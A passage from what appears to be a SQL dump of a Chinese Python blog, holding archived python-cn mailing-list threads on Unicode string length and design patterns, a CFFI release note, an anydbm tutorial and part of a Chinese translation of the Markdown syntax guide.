2012年7月18日 下午4:40\n收件人： python-cn@googlegroups.com\n\nOn Wed, Jul 18, 2012 at 04:13:52PM +0800, free.wang wrote:\n> encode utf8 本来就是  一个汉字3\n> unicode  一个汉字 2\n\nunicode 一个字符就是一个字符，除非是合成字符（严格地讲是多个字符堆在一起）。\n\nUTF-8 中也只是大部分汉字被编码为 3 字节。\n\n----------\n发件人： xpen \n日期： 2012年7月18日 下午4:58\n收件人： python-cn@googlegroups.com\n\n2012/7/18 Leo Jay \n2012/7/18 CHUN ZHANG \n> 我一直讲的都是shell里。此帖讲的也是shell里的问题。文件里的代码跟shell里的是两码事。你看清楚\n\n所以你认为在文件里和在shell里同一个unicode字符串u\'...\'，它们的长度可以是不一样的？\n\n你可以在linux下 改一下shell的encoding  然后看看输入中文文字后 会有什么变化\n\n当然 如果同一个字符串（不管它的编码是怎么样的） 已经decode成unicode了 那么长度肯定是相同的\n\n----------\n发件人： Leo Jay\n日期： 2012年7月18日 下午5:03\n收件人： python-cn@googlegroups.com\n\n\n2012/7/18 xpen \n> 2012/7/18 Leo Jay \n>>\n>> 2012/7/18 CHUN ZHANG\n>> > 我一直讲的都是shell里。此帖讲的也是shell里的问题。文件里的代码跟shell里的是两码事。你看清楚\n>> >\n>>\n>> 所以你认为在文件里和在shell里同一个unicode字符串u\'...\'，它们的长度可以是不一样的？\n>>\n> 你可以在linux下 改一下shell的encoding  然后看看输入中文文字后 会有什么变化\n>\n> 当然 如果同一个字符串（不管它的编码是怎么样的） 已经decode成unicode了 那么长度肯定是相同的\n\n\n当然，我说的就是unicode字符串啊。在楼主的例子里：\na=u\'中国\'\nlen(a)\n\n这个结果一定得是2才对。无论在什么环境里，不是2就错了。\n\n----------\n发件人： xpen \n收件人： python-cn@googlegroups.com\n\n记得很久以前开始接触py的时候 看过一片文章 关于python 和unicode的 \n\nu\'xxxx\' 就认为是把字符串转成对应的unicode码点  是绝对错误的\n\n我建议你搞个terminal试试 把encode改成gbk 输入u\'中文\'  看看转成了个啥？\n\n----------\n发件人： Xunzhen Quan\n日期： 2012年7月18日 下午6:09\n收件人： python-cn@googlegroups.com\n\n只要设置了正确的编码，u\'xxx\' 就是应该转换为对应的 Unicode 对象\n\n有任何不明白的回去看一遍 Python 教程\nhttp://docs.python.org/tutorial/introduction.html#unicode-strings\n\n----------\n发件人： Yang Yang \n日期： 2012年7月18日 下午10:07\n收件人： python-cn@googlegroups.com\n\n借宝地一问，在 Ubuntu Linux 下：\n\n>>> a = \'中文\'\n>>> print a\n中文\n>>> len(a)\n6\n>>> a = u\'中文\'\n>>> print a\n中文\n>>> len(a)\n2\n\n又应该如何理解？\n\n\n----------\n发件人： Xunzhen Quan \n日期： 2012年7月18日 下午10:27\n收件人： python-cn@googlegroups.com\n\n>>> print repr(\'中文\')\n\n\'\\xe4\\xb8\\xad\\xe6\\x96\\x87\'\n>>> print repr(u\'中文\')\nu\'\\u4e2d\\u6587\'\n\n这么理解\n\n----------\n发件人： Yang Yang \n日期： 2012年7月18日 下午10:41\n收件人： python-cn@googlegroups.com\n\n也就是说，在 Linux 下如果没有指明使用 unicode，Python 会使用 GBK 保存中文？\n\n----------\n发件人： Wang Xuerui \n日期： 2012年7月18日 下午10:44\n收件人： python-cn@googlegroups.com\n\n而且一般中文Linux系统的编码都是UTF-8。。。\n\n    # [07/18 22:43:45] xenon@ribosome ~ $\n    echo $LANG\n    zh_CN.utf8\n\n这样\n\n----------\n发件人： netcat \n日期： 2012年7月20日 上午9:54\n收件人： python-cn@googlegroups.com\n\n\n我刚才试了一下，然后觉得还是挺让人困扰的。\n测试环境：Windows 7 + python 2.7.3\n\nCMD里运行python的结果：\nD:\\Python27>python\nPython 2.7.3 (default, Apr 10 2012, 23:31:26) [MSC v.1500 32 bit (Intel)] on win32\nType "help", "copyright", "credits" or "license" for more information.\n>>> a = u\'中国\'\n>>> len(a)\n2\n>>> a\nu\'\\u4e2d\\u56fd\'\n>>>\n\n\nIDLE里运行python的结果：\nPython 2.7.3 (default, Apr 10 2012, 23:31:26) [MSC v.1500 32 bit (Intel)] on win32\nType "copyright", "credits" or "license()" for more information.\n>>> a = u\'中国\'\n>>> len(a)\n4\n>>> a\nu\'\\xd6\\xd0\\xb9\\xfa\'\n>>> \n\n可以发现在IDLE里面u\'中国\'和CMD运行的python里的u\'中国\'是不一样的\n\n----------\nFrom: 依云 \nDate: 2012/7/20\nTo: python-cn@googlegroups.com\n\nIDLE / ipython 这些东西没考虑多字节吧。\n\n----------\nFrom: GameXG\nDate: 2012/7/20\nTo: python-cn@googlegroups.com\n\n我以为我理解错了，直接u"中文" 出来的不是正确的unicode字符串，原来是ipython的BUG啊。\n', 1, 18, 11, '2012-07-21 22:14:29', '2012-07-21 22:14:29', 'sublime text 2'),
	('eb46ae52071549efb1b0e7fb98fe87b6', 'd07d60af92a14169afc444f5d5aeb45a', '7', '2523578e639445329b1a90b4c0ebf8ce', 'sublime text 2的GBK支持插件修改', 'sublime text 2,python', NULL, '主要是修改了临时文件的命名方式，原来插件使用编码中文路径的方式在tab栏占用宽度过大，\r\n同时在新版本中不能显示中文文件名，感觉不是很好，因此对临时文件直接在文件所在目录\r\n建立一个dump文件，也就是后缀直接加上dump，在tab显示仅仅多了一个\'.dump\',对于中文路径\r\n采用unicode是可以正常显示的，不用编码。\r\n\r\n另外增加了一个关闭文件的事件监听，就是将dump文件删掉（在源文件已经保存的基础上），如果\r\n不删掉临时文件，日积月累，会产生很多垃圾文件。', 1, 53, 6, '2012-07-12 09:30:58', '2012-07-12 09:30:58', NULL),
	('eb4fcc51c3ab40f2a2a900d04355aaad', '4e84ce1b8a5247bb8a6179959438b55f', NULL, NULL, 'CFFI release 0.2', 'CFFI,cpython', NULL, '\n\n@Armin Rigo\n\nHi everybody,\n\nWe released CFFI 0.2 (expected to be 1.0 soon). CFFI is a way to call C from Python.\n\nThis release is only for CPython 2.6 or 2.7. PyPy support is coming in\nthe ffi-backend branch, but not finished yet. CPython 3.x would be\neasy but requires the help of someone.\n\nThe package is available on bitbucket as well as documented. You\ncan also install it straight from the python package index: pip install cffi\n\n* Contains numerous small changes and support for more C-isms.\n\n* The biggest news is the support for installing packages that use\nffi.verify() on machines without a C compiler. Arguably, this\nlifts the last serious restriction for people to use CFFI.\n\n* Partial list of smaller changes:\n      - mappings between \'wchar_t\' and Python unicodes\n      - the introduction of ffi.NULL\n      - a possibly clearer API for ffi.new(): e.g. to allocate a single int and obtain a pointer to it, use ffi.new("int *") instead of the old   \n        ffi.new("int")\n      - and of course a plethora of smaller bug fixes\n\n* CFFI uses pkg-config to install itself if available. This helps\nlocate libffi on modern Linuxes. Mac OS/X support is available too\n(see the detailed installation instructions). Win32 should work out\nof the box. Win64 has not been really tested yet.\nCheers,\n\nArmin Rigo and Maciej Fijałkowski', 1, 8, 5, '2012-07-27 12:46:18', '2012-07-27 12:46:18', 'sublime text 2'),
	('f7eeffd66c0943cbb3ca5f4e00ac4007', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, '关于python与设计模式的讨论', 'CPyUG,python,设计模式', NULL, '\n[CPyUG] [OT] Python有没有专门讲设计模式方面的书\n\nFrom: Ryan Wang \nDate: 2012/6/11\nTo: python-cn@googlegroups.com\n\nrt\n\n----------\nFrom: 风间星魂 \nDate: 2012/6/11\nTo: python-cn@googlegroups.com\n\n\n。。。\n设计模式还是让java去搞吧。。。\n\n----------\nFrom: Jimmy Kuu \nTo: python-cn@googlegroups.com\n\n\nBruce Eckel的《Think in Python》\n\n\n----------\n发件人： Albert Lee \n日期： 2012年6月11日 下午3:36\n收件人： python-cn@googlegroups.com\n\n\n要实现设计模式，最优秀的语言是Java，在这一点上没有任何广泛应用的语言可以与Java相比（或许smalltalk，不过它太小众了）。\n\n----------\n发件人： @@ \n日期： 2012年6月11日 下午3:41\n收件人： python-cn@googlegroups.com\n\n\n好多是java的局限 必须得用这么一个模式来搞。。\n\n----------\n发件人： Zoom.Quiet \n日期： 2012年6月11日 下午3:44\n收件人： python-cn@googlegroups.com\n\n\n在 2012年6月11日 下午3:41，@@ <askfor@gmail.com> 写道：\n> 好多是java的局限 必须得用这么一个模式来搞。。\n>\n\n到底是模式成就了JAVA!\n亦或是JAVA承载了模式?\n\n\n----------\n发件人： Zephyr \n日期： 2012年6月11日 下午4:36\n收件人： python-cn@googlegroups.com\n\n\n\n\n在 2012年6月11日 下午3:41，@@ <askfor>写道：\n好多是java的局限 必须得用这么一个模式来搞。。\n\n我看《设计模式》的时候也是这种感觉。\n\n不过，“模式”在特定情境下的解决方法，还是具有学习意义的。\n\n\n----------\n发件人： lee Alexander \n日期： 2012年6月11日 下午5:14\n收件人： python-cn@googlegroups.com\n\n\n首先要搞清楚设计模式是什么，为什么出现，为了解决什么问题\n\n设计模式的出现是因为僵化的语言特性导致了java在实现很多功能的时候为了满足扩展性需要作出若干妥协和额外的实现N多的结构，所以喜欢总结的人就把多个经典场景下的这些结构挑选了最好的实现方式，所谓最佳实践，然后安个名字，方便大家交流。所以如果没有僵化的语言，设计模式就没有生存的土壤，比如ruby，python这类动态语言，很多java下要绕弯走远路去实现的功能，就一句话搞定了，模式其实就没有存在的必要。所以，如果有一门语言有大量的书籍在介绍酱紫模式，那样模式，必定是一门古板僵化的语言。慎入。javascript的模式有出书，这又是闹那样？很简单，那本书其实将的不是设计模式，而是编码模式，那毛又是编码模式呢？因为javascript太过灵活，不似python这般直接，搞一样功能有太多实现的方式，所以要弄个编码模式来给你说，酱紫写是最好的。\n\n\n----------\n发件人： panfei \n日期： 2012年6月11日 下午5:30\n收件人： python-cn@googlegroups.com\n\n\n设计模式本来就是经验性质的东西，还是非常值得去学习一下的；语言只是工具，设计模式是一种经验\n\n设计模式的书可以看看 Head first设计模式，或者那本经典的《设计模式》，不过我只是看完了前者。\n\n在 2012年6月11日 下午5:14，lee Alexander <superpowerlee@gmail.com>写道：\n\n----------\n发件人： kimjxie \n日期： 2012年6月11日 下午10:44\n收件人： python-cn@googlegroups.com\n\n\nGof成书是94年，java发布1.0是95年的事\n\n发件人： GeekGao \n日期： 2012年6月12日 上午1:52\n收件人： "python-cn(华蟒用户组,CPyUG 邮件列表)" <python-cn@googlegroups.com>\n\n\nThinking in Python\n\n----------\n发件人： dphacker \n日期： 2012年6月12日 上午3:03\n收件人： python-cn@googlegroups.com\n\n\n写的很不错，正是我最近从C#转到Python所体会到的，Python的灵活让C#设计模式就像是自己给自己设圈子，很多模式在Python里面完全就是内置的，很多设计模式用到反射，而反射在Python中真是行云流水，自省，函数式编程，动态类型，已经省去了大半的设计模式。。。具体的高人们可以一一列举。\n\n在 2012年6月11日星期一UTC+8下午5时14分01秒，Alexander.Lee写道：\n首先要搞清楚设计模式是什么，为什么出现，为了解决什么问题\n\n设计模式的出现是因为僵化的语言特性导致了java在实现很多功能的时候为了满足扩展性需要作出若干妥协和额外的实现N多的结构，所以喜欢总结的人就把多个经典场景下的这些结构挑选了最好的实现方式，所谓最佳实践，然后安个名字，方便大家交流。所以如果没有僵化的语言，设计模式就没有生存的土壤，比如ruby，python这类动态语言，很多java下要绕弯走远路去实现的功能，就一句话搞定了，模式其实就没有存在的必要。所以，如果有一门语言有大量的书籍在介绍酱紫模式，那样模式，必定是一门古板僵化的语言。慎入。\n\n----------\n发件人： shhgs \n日期： 2012年6月12日 上午10:17\n收件人： python-cn@googlegroups.com\n\n\n这本书还是别推荐了。\n\nOn Mon, Jun 11, 2012 at 03:11:54PM +0800, Jimmy Kuu wrote:\n> *Bruce Eckel的《Think in Python》*\n\n----------\n发件人： shhgs \n日期： 2012年6月12日 上午10:20\n收件人： python-cn@googlegroups.com\n\n\n我更推荐大家学一点Haskell。\n\n我自己感觉，学了Haskell之后，自己写的Python代码都不一样了。\n\n----------\nFrom: lee Alexander \nDate: 2012/6/12\nTo: python-cn@googlegroups.com\n\n\n写点心得体会大家看看怎么个不一样法丫\n\n\n----------\n发件人： Rujia Liu \n日期： 2012年6月12日 上午10:36\n收件人： python-cn@googlegroups.com\n\n\n这个要re\n\n\n\n----------\n发件人： Neil Chen \n日期： 2012年6月12日 上午10:40\n收件人： python-cn@googlegroups.com\n\n\n难道是为了模式而模式？这个思路完全反了吧。\n在高级的语言里很多模式是不可见的。\n应该说是 java 的面向对象特性太简单，才逼不得已需要运用到这些代码范式才能组织好代码，也就是模式。\n\n在 2012年6月11日 下午3:36，Albert Lee <hanzhupeng@gmail.com>写道：\n要实现设计模式，最优秀的语言是Java，在这一点上没有任何广泛应用的语言可以与Java相比（或许smalltalk，不过它太小众了）。\n\n\n----------\n发件人： 风间星魂 \n日期： 2012年6月12日 上午11:28\n收件人： python-cn@googlegroups.com\n\n\n2个问题\n为了面向对象而面向对象\n为了模式而模式\n\n----------\n发件人： Jia Baozhen \n日期： 2012年6月12日 上午11:50\n收件人： python-cn@googlegroups.com\n\n\n首先，设计模式和java没啥必然的关系吧。就拿gof的那本书来说，也只是限于oo的领域里面来讨论（以c++和smalltalk为示例语言）。显然，oo以外的编程范式里面肯定也有一些较为通用的解决方案存在。\n\n其次，语言的“古板僵化”与设计模式似乎也没有必然关系吧？比如，我们考虑以下几种场景或者设计模式：\n1）我们需要在运行时动态的切换、动态添加几种压缩算法；\n2）我们需要表示一种嵌套的结构；\n3）web或者gui开发中的mvc模式；\n\n比如，开发语言用python、ruby之类的动态语言，或者c之类的静态语言，或者javascript，我们怎么解决上述的问题？我们能否总结出一些通用的解决方案？\n\n----------\n发件人： lee Alexander \n日期： 2012年6月12日 上午11:57\n收件人： python-cn@googlegroups.com\n\n\nGOF的设计模式一开始确实是和JAVA没啥关系，那时候的OO是C++，但是问题的存在是一样样的。JAVA和设计模式如此般配，是因为正好符合了设计模式的应用范围。否则就是不是JAVA把设计模式发扬光大了。\n个人感觉抛开Java来说，最初的设计模式是教大家把C++中C的部分避开，如何写得更加符合OO的方法的最佳实践\n\n\n另，模式是一直存在的，python中也是有观察者模式的，不过，实现起来过于简单，没有必要单独拿出来大篇论述。\n\n设计模式的学习还是有点用处的，特别是在是OO教信徒交流的时候，说半天如何实现不如一句，就是观察者模式 ，来得直接\n\n\n----------\n发件人： xpen \n日期： 2012年6月12日 下午12:05\n收件人： python-cn@googlegroups.com\n\n\n感觉设计模式就是一些经典的用例 我们可以参考利用 在开发过程中可以更好地控制经常变化的那部分内容 把改动所带来的影响最小化 保证质量 一些经常的用例还是需要了解的 \n\n----------\n发件人： 你知道joshua么 \n日期： 2012年6月12日 下午1:34\n收件人： python-cn@googlegroups.com\n\n\nThinking in python 是也。。。\n\nOn Monday, June 11, 2012 1:37:39 PM UTC+8, openspace wrote:\nrt\n\nOn Monday, June 11, 2012 1:37:39 PM UTC+8, openspace wrote:\nrt\n\n----------\n发件人： shhgs \n日期： 2012年6月12日 下午1:40\n收件人： python-cn@googlegroups.com\n\n\n好吧。那天写一点。 Hahskell非装B指南\n\n----------\n发件人： Harold.Miao \n日期： 2012年6月12日 下午1:41\n收件人： python-cn@googlegroups.com\n\n\n\n赶紧写吧，正在犹豫学点函数式编程\n\n\nBest Regards, \nHarold Miao\n\n----------\n发件人： lee Alexander \n日期： 2012年6月12日 下午1:58\n收件人： python-cn@googlegroups.com\n\n\n等着看\n\n在 2012年6月12日 下午1:40，shhgs <shhgs.efhilt@gmail.com>写道：\n好吧。那天写一点。 Hahskell非装B指南\n\n----------\n发件人： 刘鑫 \n日期： 2012年6月12日 下午3:02\n收件人： python-cn@googlegroups.com\n\n\n所有动态语言的设计模式学习，我推荐《Ruby 元编程》不管你用lPerl、Python、Ruby、PHP还是Smalltalk\n\n在 2012年6月12日 下午1:58，lee Alexander <superpowerlee@gmail.com>写道：\n\n\n劉鑫\nMarch.Liu\n\n----------\nFrom: Zhang Jiawei \nDate: 2012/6/12\nTo: python-cn@googlegroups.com\n\n\n草创年代的程序员，就一个“读”字 一个“写”字。\n\n不要谈模式。多读源代码，多写，模式自在心中。\n\n----------\n发件人： bhuztez \n日期： 2012年6月12日 下午11:02\n收件人： "python-cn(华蟒用户组,CPyUG 邮件列表)" <python-cn@googlegroups.com>\n\n\n我觉得模式还是有点用的，至少交流的时候，可以有统一的名词，节约点时间。\n\n\n----------\n发件人： fengjian/风间星魂\n日期： 2012年6月12日 下午11:22\n收件人： python-cn@googlegroups.com\n\n\n我觉的没大用，除了用来显示写的很OO。\n\n----------\n发件人： chenw \n日期： 2012年6月12日 下午11:34\n收件人： python-cn@googlegroups.com\n\n问题的本质是： 巨人愿不愿意将自己的肩膀给你站的问题。据我所知 很少有，尤其国内巨人少，德艺双馨的更少。\n\n发件人： @@ \n日期： 2012年6月13日 上午9:03\n收件人： python-cn@googlegroups.com\n\n\n不一定。有的模式基本就是特定场景的最佳实现方法了。\n知道的话直接就用了，不知道的话自己想好的情况下想到了也浪费了时间。\n\n----------\n发件人： Jia Baozhen \n日期： 2012年6月13日 上午9:28\n收件人： python-cn@googlegroups.com\n\n\n可以开阔眼界，可以学习别人的经验总结，可以不用重复发明解决方案。\n\n有点像武术拳谱，武功秘籍，内功心法；当然，总是有各种机缘巧合、各种天赋异禀、各种无师自通存在。\n\n\n2012/6/12 fengjian/风间星魂 \n我觉的没大用，除了用来显示写的很OO。\n\n\n----------\n发件人： Jia Baozhen \n日期： 2012年6月13日 上午9:35\n收件人： python-cn@googlegroups.com\n\n\n计算机技术的中心从来就不在大陆，不要在大陆寻找巨人。\n\n', 1, 33, 6, '2012-07-13 01:00:10', '2012-07-13 16:41:17', 'sublime text 2'),
	('f8a0d126a6704dd0b7933e4a2609f41d', 'd07d60af92a14169afc444f5d5aeb45a', '3', '5c62a8222652401da8ca081d404f50d7', 'python anydbm模块', 'dbm,python', NULL, '\n\nanydbm允许我们将一个磁盘上的文件与一个“dict-like”对象关联起来，操作这个“dict-like”对象，就像操作dict对象一样，最后可以将“dict-like”的数据持久化到文件。对这个"dict-like"对象进行操作的时候，key和value的类型必须是字符串。下面是使用anydbm的例子：\n\n    #coding=utf-8\n    import anydbm\n\n    def CreateData():\n        try:\n            db = anydbm.open(\'db.dat\', \'c\')\n            # key与value必须是字符串\n            # db[\'int\'] = 1\n            # db[\'float\'] = 2.3\n            db[\'string\'] = "I like python."\n            db[\'key\'] = \'value\'\n        finally:\n            db.close()\n            \n    def LoadData():\n        db = anydbm.open(\'db.dat\', \'r\')\n        for item in db.items():\n            print item\n        db.close()\n            \n    if __name__ == \'__main__\':\n        CreateData()\n        LoadData()\n\n     anydbm.open(filename[, flag[, mode]])，filename是关联的文件路径，可选参数flag可以是: \'r\': 只读, \'w\': 可读写, \'c\': 如果数据文件不存在，就创建，允许读写; \'n\': 每次调用open()都重新创建一个空的文件。mode是unix下文件模式，如0666表示允许所有用户读写。\n\n\n', 1, 34, 6, '2012-07-11 10:46:24', '2012-07-13 16:37:08', NULL),
	('fd1f3be720884decbbd40f659cf1157a', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, 'Markdown 语法说明', 'markdown', NULL, '\n\n**NOTE:** This is Simplelified  Chinese Edition Document of Markdown Syntax. If you are seeking for English Edition Document. Please refer to [Markdown: Syntax][eng-doc].\n\n[eng-doc]:http://daringfireball.net/projects/markdown/syntax\n\n**声明：** 这份文档派生(fork)于[繁体中文版](http://markdown.tw/)，在此基础上进行了繁体转简体工作，并进行了适当的润色。此文档用 Markdown 语法编写，你可以到这里[查看它的源文件][src1]。「繁体中文版的原始文件可以[查看这里][src] 。」--By @[riku][t] / 本项目托管于 [GitCafe][g]\n\n**注：** 本项目同时也托管于 [Github][] 上，请通过 fork＋pull request 方式来帮忙改进本项目。\n\n  [src1]: http://gitcafe.com/riku/Markdown-Syntax-CN/blob/master/syntax.md\n  [src]: https://github.com/othree/markdown-syntax-zhtw/blob/master/syntax.md\n  [t]: http://twitter.com/riku\n  [g]: http://gitcafe.com/riku/Markdown-Syntax-CN\n  [Github]: https://github.com/riku/Markdown-Syntax-CN\n\nMarkdown 语法说明 (简体中文版) / \n================\n\n*   [概述](#overview)\n    *   [宗旨](#philosophy)\n    *   [兼容 HTML](#html)\n    *   [特殊字符自动转换](#autoescape)\n*   [区块元素](#block)\n    *   [段落和换行](#p)\n    *   [标题](#header)\n    *   [区块引用](#blockquote)\n    *   [列表](#list)\n    *   [代码区块](#precode)\n    *   [分隔线](#hr)\n*   [区段元素](#span)\n    *   [链接](#link)\n    *   [强调](#em)\n    *   [代码](#code)\n    *   [图片](#img)\n*   [其它](#misc)\n    *   [反斜杠](#backslash)\n    *   [自动链接](#autolink)\n*   [感谢](#acknowledgement)\n\n* * *\n\n<h2 id="overview">概述</h2>\n\n<h3 id="philosophy">宗旨</h3>\n\nMarkdown 的目标是实现「易读易写」。\n\n可读性，无论如何，都是最重要的。一份使用 Markdown 格式撰写的文件应该可以直接以纯文本发布，并且看起来不会像是由许多标签或是格式指令所构成。Markdown 语法受到一些既有 text-to-HTML 格式的影响，包括 [Setext] [1]、[atx] [2]、[Textile] [3]、[reStructuredText] [4]、[Grutatext] [5] 和 [EtText] [6]，而最大灵感来源其实是纯文本电子邮件的格式。\n\n  [1]: http://docutils.sourceforge.net/mirror/setext.html\n  [2]: http://www.aaronsw.com/2002/atx/\n  [3]: http://textism.com/tools/textile/\n  [4]: http://docutils.sourceforge.net/rst.html\n  [5]: http://www.triptico.com/software/grutatxt.html\n  [6]: http://ettext.taint.org/doc/\n\n总之， Markdown 的语法全由一些符号所组成，这些符号经过精挑细选，其作用一目了然。比如：在文字两旁加上星号，看起来就像\\*强调\\*。Markdown 的列表看起来，嗯，就是列表。Markdown 的区块引用看起来就真的像是引用一段文字，就像你曾在电子邮件中见过的那样。\n\n<h3 id="html">兼容 HTML</h3>\n\nMarkdown 语法的目标是：成为一种适用于网络的*书写*语言。\n\nMarkdown 不是想要取代 HTML，甚至也没有要和它相近，它的语法种类很少，只对应 HTML 标记的一小部分。Markdown 的构想*不是*要使得 HTML 文档更容易书写。在我看来， HTML 已经很容易写了。Markdown 的理念是，能让文档更容易读、写和随意改。HTML 是一种*发布*的格式，Markdown 是一种*书写*的格式。就这样，Markdown 的格式语法只涵盖纯文本可以涵盖的范围。\n\n不在 Markdown 涵盖范围之内的标签，都可以直接在文档里面用 HTML 撰写。不需要额外标注这是 HTML 或是 Markdown；只要直接加标签就可以了。\n\n要制约的只有一些 HTML 区块元素――比如 `<div>`、`<table>`、`<pre>`、`<p>` 等标签，必须在前后加上空行与其它内容区隔开，还要求它们的开始标签与结尾标签不能用制表符或空格来缩进。Markdown 的生成器有足够智能，不会在 HTML 区块标签外加上不必要的 `<p>` 标签。\n\n例子如下，在 Markdown 文件里加上一段 HTML 表格：\n\n    这是一个普通段落。\n\n    <table>\n        <tr>\n            <td>Foo</td>\n        </tr>\n    </table>\n\n    这是另一个普通段落。\n\n请注意，在 HTML 区块标签间的 Markdown 格式语法将不会被处理。比如，你在 HTML 区块内使用 Markdown 样式的`*强调*`会没有效果。\n\nHTML 的区段（行内）标签如 `<span>`、`<cite>`、`<del>` 可以在 Markdown 的段落、列表或是标题里随意使用。依照个人习惯，甚至可以不用 Markdown 格式，而直接采用 HTML 标签来格式化。举例说明：如果比较喜欢 HTML 的 `<a>` 或 `<img>` 标签，可以直接使用这些标签，而不用 Markdown 提供的链接或是图像标签语法。\n\n和处在 HTML 区块标签间不同，Markdown 语法在 HTML 区段标签间是有效的。\n\n<h3 id="autoescape">特殊字符自动转换</h3>\n\n在 HTML 文件中，有两个字符需要特殊处理： `<` 和 `&` 。 `<` 符号用于起始标签，`&` 符号则用于标记 HTML 实体，如果你只是想要显示这些字符的原型，你必须要使用实体的形式，像是 `&lt;` 和 `&amp;`。\n\n`&` 字符尤其让网络文档编写者受折磨，如果你要打「`AT&T`」 ，你必须要写成「`AT&amp;T`」。而网址中的 `&` 字符也要转换。比如你要链接到：\n\n    http://images.google.com/images?num=30&q=larry+bird\n\n你必须要把网址转换写为：\n\n    http://images.google.com/images?num=30&amp;q=larry+bird\n\n才能放到链接标签的 `href` 属性里。不用说也知道这很容易忽略，这也可能是 HTML 标准检验所检查到的错误中，数量最多的。\n\nMarkdown 让你可以自然地书写字符，需要转换的由它来处理好了。如果你使用的 `&` 字符是 HTML 字符实体的一部分，它会保留原状，否则它会被转换成 `&amp`;。\n\n所以你如果要在文档中插入一个版权符号 `©`，你可以这样写：\n\n    &copy;\n\nMarkdown 会保留它不动。而若你写：\n\n    AT&T\n\nMarkdown 就会将它转为：\n\n    AT&amp;T\n\n类似的状况也会发生在 `<` 符号上，因为 Markdown 允许 [兼容 HTML](#html) ，如果你是把 `<` 符号作为 HTML 标签的定界符使用，那 Markdown 也不会对它做任何转换，但是如果你写：\n\n    4 < 5\n\nMarkdown 将会把它转换为：\n\n    4 &lt; 5\n\n不过需要注意的是，code 范围内，不论是行内还是区块， `<` 和 `&` 两个符号都*一定*会被转换成 HTML 实体，这项特性让你可以很容易地用 Markdown 写 HTML code （和 HTML 相对而言， HTML 语法中，你要把所有的 `<` 和 `&` 都转换为 HTML 实体，才能在 HTML 文件里面写出 HTML code。）\n\n* * *\n\n<h2 id="block">区块元素</h2>\n\n\n<h3 id="p">段落和换行</h3>\n\n一个 Markdown 段落是由一个或多个连续的文本行组成，它的前后要有一个以上的空行（空行的定义是显示上看起来像是空的，便会被视为空行。比方说，若某一行只包含空格和制表符，则该行也会被视为空行）。普通段落不该用空格或制表符来缩进。\n\n「由一个或多个连续的文本行组成」这句话其实暗示了 Markdown 允许段落内的强迫换行（插入换行符），这个特性和其他大部分的 text-to-HTML 格式不一样（包括 Movable Type 的「Convert Line Breaks」选项），其它的格式会把每个换行符都转成 `<br />` 标签。\n\n如果你*确实*想要依赖 Markdown 来插入 `<br />` 标签的话，在插入处先按入两个以上的空格然后回车。\n\n的确，需要多费点事（多加空格）来产生 `<br />` ，但是简单地「每个换行都转换为 `<br />`」的方法在 Markdown 中并不适合， Markdown 中 email 式的 [区块引用][bq] 和多段落的 [列表][l] 在使用换行来排版的时候，不但更好用，还更方便阅读。\n\n  [bq]: #blockquote\n  [l]:  #list\n\n<h3 id="header">标题</h3>\n\nMarkdown 支持两种标题的语法，类 [Setext] [1] 和类 [atx] [2] 形式。\n\n类 Setext 形式是用底线的形式，利用 `=` （最高阶标题）和 `-` （第二阶标题），例如：\n\n    This is an H1\n    =============\n\n    This is an H2\n    -------------\n\n任何数量的 `=` 和 `-` 都可以有效果。\n\n类 Atx 形式则是在行首插入 1 到 6 个 `#` ，对应到标题 1 到 6 阶，例如：\n\n    # 这是 H1\n\n    ## 这是 H2\n\n    ###### 这是 H6\n\n你可以选择性地「闭合」类 atx 样式的标题，这纯粹只是美观用的，若是觉得这样看起来比较舒适，你就可以在行尾加上 `#`，而行尾的 `#` 数量也不用和开头一样（行首的井字符数量决定标题的阶数）：\n\n    # 这是 H1 #\n\n    ## 这是 H2 ##\n\n    ### 这是 H3 ######\n\n\n<h3 id="blockquote">区块引用 Blockquotes</h3>\n\nMarkdown 标记区块引用是使用类似 email 中用 `>` 的引用方式。如果你还熟悉在 email 信件中的引言部分，你就知道怎么在 Markdown 文件中建立一个区块引用，那会看起来像是你自己先断好行，然后在每行的最前面加上 `>` ：\n\n    > This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,\n    > consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.\n    > Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.\n    > \n    > Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse\n    > id sem consectetuer libero luctus adipiscing.\n\nMarkdown 也允许你偷懒只在整个段落的第一行最前面加上 `>` ：\n\n    > This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,\n    consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.\n    Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.\n\n    > Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse\n    id sem consectetuer libero luctus adipiscing.\n\n区块引用可以嵌套（例如：引用内的引用），只要根据层次加上不同数量的 `>` ：\n\n    > This is the first level of quoting.\n    >\n    > > This is nested blockquote.\n    >\n    > Back to the first level.\n\n引用的区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等：\n\n    > ## 这是一个标题。\n    > \n    > 1.   这是第一行列表项。\n    > 2.   这是第二行列表项。\n    > \n    > 给出一些例子代码：\n    > \n    >     return shell_exec("echo $input | $markdown_script");\n\n任何像样的文本编辑器都能轻松地建立 email 型的引用。例如在 BBEdit 中，你可以选取文字后然后从选单中选择*增加引用阶层*。\n\n<h3 id="list">列表</h3>\n\nMarkdown 支持有序列表和无序列表。\n\n无序列表使用星号、加号或是减号作为列表标记：\n\n    *   Red\n    *   Green\n    *   Blue\n\n等同于：\n\n    +   Red\n    +   Green\n    +   Blue\n\n也等同于：\n\n    -   Red\n    -   Green\n    -   Blue\n\n有序列表则使用数字接着一个英文句点：\n\n    1.  Bird\n    2.  McHale\n    3.  Parish\n\n很重要的一点是，你在列表标记上使用的数字并不会影响输出的 HTML 结果，上面的列表所产生的 HTML 标记为：\n\n    <ol>\n    <li>Bird</li>\n    <li>McHale</li>\n    <li>Parish</li>\n    </ol>\n\n如果你的列表标记写成：\n\n    1.  Bird\n    1.  McHale\n    1.  Parish\n\n或甚至是：\n\n    3. Bird\n    1. McHale\n    8. Parish\n\n你都会得到完全相同的 HTML 输出。重点在于，你可以让 Markdown 文件的列表数字和输出的结果相同，或是你懒一点，你可以完全不用在意数字的正确性。\n\n如果你使用懒惰的写法，建议第一个项目最好还是从 1. 开始，因为 Markdown 未来可能会支持有序列表的 start 属性。\n\n列表项目标记通常是放在最左边，但是其实也可以缩进，最多 3 